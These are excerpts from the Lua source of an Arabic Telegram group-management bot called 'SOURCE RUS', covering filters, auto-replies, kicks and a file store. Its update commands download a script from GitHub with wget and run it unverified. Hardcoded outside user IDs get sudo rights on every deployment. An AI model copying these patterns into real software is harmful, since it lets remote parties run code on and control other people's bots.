...
if res ~= 200 then
print('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ SOURCE RUS ┉  ┉ ┉ ┉ ┉≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \naٴ≪┉ ┉ ┉ ┉ ┉ SOURCE RUS ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35mٴ≪┉ ┉ ┉ ┉ ┉ SOURCE RUS ┉  ┉ ┉ ┉ ┉≫ٴ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua RUS.lua')
end
...
echo "ٴ≪┉ ┉ ┉ ┉ ┉ SOURCE RUS ┉  ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ SOURCE RUS ┉  ┉ ┉ ┉ ┉≫ٴ ┉"
exit 1
fi
if [ ! $token ]; then
echo "ٴ≪┉ ┉ ┉ ┉ ┉ SOURCE RUS ┉  ┉ ┉ ┉ ┉≫ٴ ٴ≪┉ ┉ ┉ ┉ ┉ SOURCE RUS ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉"
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./RUS.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("DRG", "w")  
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/SRC-RUS/Files_Dragon/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,5002164804,5293493528}   
...
if tonumber(user_id) == tonumber(5293493528) then  
var = true  
elseif tonumber(user_id) == tonumber(5002164804) then
var = true  
elseif tonumber(user_id) == tonumber(5002164804) then
var = true  
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚁𝚄𝚂 .")  
...
--------------------------------------------------------------------------------------------------------------
function SourceRUS(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,RUS_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf RUS.lua')
os.execute('wget https://raw.githubusercontent.com/alielsayed76/RUS/main/RUS.lua')
send(msg.chat_id_, msg.id_,' ℘︙ تم تحديث السورس \n ℘︙ لديك اخر اصدار لسورس روس\n ℘︙ الاصدار » { v 1.5}')
dofile('RUS.lua')  
end
if text == 'الاصدار ℘' and Devali(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ℘︙ اصدار سورس روس \n ℘︙ الاصدار »{ v 1.5}')
end
...
send(msg.chat_id_, msg.id_,'℘︙  عدد الكروبات الان » { '..#group..' }'..RUSk..''..RUS..'\n℘︙  الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
local RUS1_Msg = database:get(bot_id.."RUS1:Add:Filter:Rp2"..text..msg.chat_id_)   
if RUS1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
--------------------------------------------------------------------------------------------------------------
if RUS_Msg and not Special(msg) then  
local RUS_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if RUS_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ℘︙ ["..RUS_Msg.."] \n")
else
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](t.me/h_a_y_a_7)}\n ℘︙ ["..RUS_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ℘︙ عذرا » {["..data.first_name_.."](t.me/h_a_y_a_7)}\n ℘︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."RUS:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."RUS:blocname"..msg.chat_id_)
...
if name_MRali then 
names_MRali = database:smembers(bot_id.."RUS:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."RUS:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."RUS:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."RUS:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."RUS:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."RUS:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function ali_mrali_new(mrali1,mrali2)
if mrali2 and mrali2.first_name_ then 
if mrali2.first_name_:match("(.*)"..database:get(bot_id.."RUS:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."RUS:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrali_nnn = database:get(bot_id.."RUS:nump"..msg.chat_id_) or 5
local mrali_nnn2 = database:get(bot_id.."RUS:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrali_nnn2) == tonumber(mrali_nnn) or tonumber(mrali_nnn2) > tonumber(mrali_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."RUS:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "℘︙ عزيزي >>["..mrali2.username_.."](https://t.me/"..(mrali2.username_ or "S0DRG")..")\n℘︙ aliك وضع التوحيد ⪼ {"..database:get(bot_id.."RUS:teh"..msg.chat_id_).."} بجانب اسمك\n℘︙ عدد المحاولات المتبقيه {"..(tonumber(mrali_nnn) - tonumber(mrali_nnn2)).."}")
end
end
end
end
...
local RUSChengName = database:get(bot_id.."RUS:Cheng:Name"..data.id_)
if not data.first_name_ then 
if RUSChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..RUSChengName..']')
database:del(bot_id.."RUS:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if RUSChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."RUS:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local RUSChengUserName = database:get(bot_id.."RUS:Cheng:UserName"..data.id_)
if not data.username_ then 
if RUSChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..RUSChengUserName..']')
database:del(bot_id.."RUS:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if RUSChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."RUS:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local RUSChengPhoto = database:get(bot_id.."RUS:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if RUSChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."RUS:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if RUSChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."RUS:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
℘ ⦑ SOURCE RUS ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
℘︙ [Source Channel](t.me/h_a_y_a_7)
℘︙ [Source Update ](t.me/h_a_y_a_7)     
℘︙ [Source developer](t.me/kareflk1)     
℘︙ [Dragon programmer](t.me/EL_RAYEQ) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𓂅 . [TWS RUS](t.me/h_a_y_a_7)     
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
if Devali(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/SRC-RUS/Files_Dragon/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ℘︙ اهلا بك في متجر ملفات روس\n ℘︙ ملفات السورس ↓\nٴ≪┉ ┉ ┉ ┉ ┉ SOURCE RUS ┉  ┉ ┉ ┉ ┉≫ٴ\n\n"
local TextE = "\nٴ≪┉ ┉ ┉ ┉ ┉ SOURCE RUS ┉  ┉ ┉ ┉ ┉≫ٴ\n ℘︙ علامة تعني { ✔️ } ملف مفعل\n ℘︙ علامة تعني { ✖ } ملف معطل\n ℘︙ قناة سورس روس ↓\n".." ℘︙ [اضغط هنا لدخول](t.me/h_a_y_a_7) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/SRC-RUS/Files_Dragon/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('RUS.lua')  
else
send(msg.chat_id_, msg.id_," ℘︙ عذرا الملف لايدعم سورس روس \n") 
end
return false
end
...
if database:get(bot_id..'DRAGOON:change:ali'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'DRAGOON:change:ali'..msg.chat_id_)  
else
...
if not database:get(bot_id..'DRAGOON:change:ali'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:ali'..msg.chat_id_,true)  
Text = '\n ℘︙ تم تعطيل امر تحويل'
else
...
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:ali'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
...
local UserName = (b.username_ or "SRC-RUS")
...
function Function_RUS(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_RUS, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_RUS, nil)
return false 
end
...
database:set(bot_id.."RUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."RUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ℘︙ ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."RUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."RUS1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."RUS1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."RUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ℘︙ تم منع الكلمه مع التحذير")  
database:del(bot_id.."RUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."RUS1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."RUS1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."RUS1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ℘︙ ارسل الكلمه الان")  
database:set(bot_id.."RUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."RUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."RUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."RUS1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."RUS1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."RUS1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."RUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."RUS1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."RUS1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ℘︙ قائمة المنع \nٴ≪┉ ┉ ┉ ┉ ┉ SOURCE RUS ┉  ┉ ┉ ┉ ┉≫ٴ\n"
for k,v in pairs(list) do  
local RUS_Msg = database:get(bot_id.."RUS1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..RUS_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'روس').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'روس')
local RUS_Msg = {
'عمغي 🥺💕.',
...
send(msg.chat_id_, msg.id_,'['..RUS_Msg[math.random(#RUS_Msg)]..']') 
return false
end
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:RUS:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ℘︙ ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:RUS:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:RUS:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:RUS:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:RUS:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"℘︙ تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:RUS:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:RUS:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:RUS:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:RUS:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:RUS:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:RUS:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:RUS:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:RUS:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:RUS:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:RUS:List:Rd:Sudo")
end
...
end --الكود حصري سورس روس يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:RUS:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:RUS:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"℘︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:RUS:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:RUS:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:RUS:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:RUS:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:RUS:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:RUS:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:RUS:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:RUS:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:RUS:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:RUS:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:RUS:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:RUS:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"℘︙تم حفظ الرد")
return false  
end  
...
if text then
local Text = database:get(bot_id.."botss:RUS:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:RUS:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:RUS:Add:Rd:Sudo:Text2"..text)   
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'روس').." غادر" or text == 'بوت غادر' then  
...
-- vardump(data) 
RUSdx(msg.chat_id_, msg.id_, ' ℘︙ ايدي المجموعة » ( '..msg.chat_id_..' )\n ℘︙ عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ℘︙ عدد المحظورين » ( *'..data.kicked_count_..' )*\n ℘︙ عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
{
{text = '𝐃𝐑𝐀𝐆𝐎𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/h_a_y_a_7"},
},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_, msg.id_, t..'ٴ≪┉ ┉ ┉ ┉ ┉ SOURCE RUS ┉  ┉ ┉ ┉ ┉≫ٴٴ\n℘︙ ➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝚁𝚄𝚂 . ](t.me/h_a_y_a_7)➤ ')
end
...
local texting = {"ادب سسز يباوع ali بنات 😂🥺"," مو خوش ولد 😶","زاحف وما احبه 😾😹"}
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'روس')
if not database:get(bot_id.."Fun_Bots:"..msg.chat_id_) then
if text ==  ""..Name_Bot..' شنو رئيك بهاذا' and tonumber(msg.reply_to_message_id_) > 0 then     
function FunBot(extra, result, success) 
local Fun = {'لوكي وزاحف من ساع زحفلي وحضرته 😒','خوش ولد و ورده مال الله 💋🙄','يلعب ع البنات 🙄', 'ولد زايعته الكاع 😶🙊','صاك يخبل ومعضل ','محلو وشواربه جنها مكناسه 😂🤷🏼‍♀️','اموت علي 🌝','هوه غير ا��حب مال اني 🤓❤️','مو خوش ولد صراحه ☹️','ادبسز وميحترم البنات  ', 'فد واحد قذر 🙄😒','ماطيقه كل ما اكمشه ريحته جنها بخاخ بف باف مال حشرات 😂🤷‍♀️','مو خوش ولد 🤓' } 
...
RUS = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(RUS)
...
------------------------------------------------------------------------
local RUSAbot = database:get(bot_id.."RUS1:Add:Filter:Rp2"..text..result.chat_id_)   
if RUSAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ℘︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ℘︙ ["..RUSAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local RUS1_Msg = database:get(bot_id.."RUS1:Add:Filter:Rp2"..text..result.chat_id_)   
if RUS1_Msg then    
send(msg.chat_id_, msg.id_," ℘︙ "..RUS1_Msg)
